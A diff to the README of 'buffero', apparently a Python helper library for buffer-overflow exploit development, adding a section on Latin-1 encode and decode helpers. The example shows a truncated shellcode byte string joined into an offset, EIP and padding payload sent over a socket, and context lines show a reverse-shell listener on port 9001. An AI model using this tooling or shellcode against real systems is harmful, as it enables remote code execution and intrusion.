@@ -111,3 +111,24 @@ import buffero
 # Listening on 0.0.0.0:9001
 buffero.spawn_rev_shell(9001)
 ```
+
+---
+
+### Encoding and Decoding
+
+In python3 socket.send() will work only byte type array. The encode method will encode the given string into 'Latin-1' encoded byte array.
+The decode method will do the same but reverse order. Generate a string with 'Latin-1' encoding from byte array. This is useful when shellcode concatenated with the other pieces of the payload.
+
+```python
+import buffero
+
+shellcode  = ""
+shellcode += b"\xbb\x6a\xf5\xdd\x01\xd9\xe8\xd9\x74\x24\xf4"
+...
+shellcode += b"\x41\xa1\x25\xeb\xda\x44\x49\x58\xda\x4c"
+
+# Decoding to string the given bytes type shellcode.
+payload += offset + eip + padding + buffero.decode(shellcode) + suffix
+
+# Encoding to bytes type array the concatenated payload
+s.send(buffero.encode(payload))
